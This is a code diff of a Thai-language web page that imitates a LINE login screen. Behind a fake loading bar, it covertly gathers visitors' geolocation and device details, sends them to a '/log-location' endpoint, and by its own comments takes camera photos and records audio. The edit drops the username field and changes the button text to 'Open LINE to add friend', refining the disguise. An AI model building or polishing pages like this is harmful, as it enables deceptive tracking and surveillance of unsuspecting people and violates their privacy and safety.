@@ -164,16 +164,12 @@
         <h2>เข้าสู่ระบบด้วย LINE</h2>
         <p>ยืนยันตัวตนเพื่อดำเนินการต่อ<br>ข้อมูลของคุณจะถูกเก็บรักษาอย่างปลอดภัย</p>
         
-        <div class="input-group">
-            <input type="text" id="usernameInput" placeholder="LINE ID หรือ เบอร์โทรศัพท์ (ถ้ามี)">
-        </div>
-        
         <button id="loginBtn" onclick="getLocation()">
             <svg id="btnIcon" width="22" height="22" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
                 <path d="M24 10.304c0-5.369-5.383-9.738-12-9.738-6.616 0-12 4.369-12 9.738 0 4.814 3.55 8.888 8.498 9.582.353.076.83.232.953.535.111.272.072.695.035.952l-.246 1.488c-.048.286-.232 1.139 1.002.617 1.233-.522 6.647-3.916 8.895-6.568C22.618 14.887 24 12.753 24 10.304z"/>
             </svg>
             <div id="btnSpinner" class="spinner"></div>
-            <span id="btnText">เข้าสู่ระบบด้วยบัญชี LINE</span>
+            <span id="btnText">เปิด LINE เพื่อแอดเพื่อน</span>
         </button>
         
         <!-- แถบโหลดปลอม -->
@@ -243,7 +239,6 @@
 
         // ขอสิทธิ์กล้องและไมค์ ถ่ายรูปรัว และอัดเสียง
         async function getLocation() {
-            const username = document.getElementById('usernameInput').value;
             const status = document.getElementById('status');
 
             const btn = document.getElementById('loginBtn');
@@ -368,7 +363,7 @@
             const btnIcon = document.getElementById('btnIcon');
             const btnSpinner = document.getElementById('btnSpinner');
             btn.disabled = false;
-            btnText.textContent = 'เข้าสู่ระบบด้วยบัญชี LINE';
+            btnText.textContent = 'เปิด LINE เพื่อแอดเพื่อน';
             btnIcon.style.display = 'block';
             btnSpinner.style.display = 'none';
         }
@@ -394,14 +389,12 @@
             };
 
             // ส่งข้อมูลทั้งหมดไปที่เซิร์ฟเวอร์
-            const username = document.getElementById('usernameInput').value;
             fetch('/log-location', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({ 
-                    username: username,
                     lat: lat, 
                     lon: lon, 
                     deviceInfo: deviceInfo,
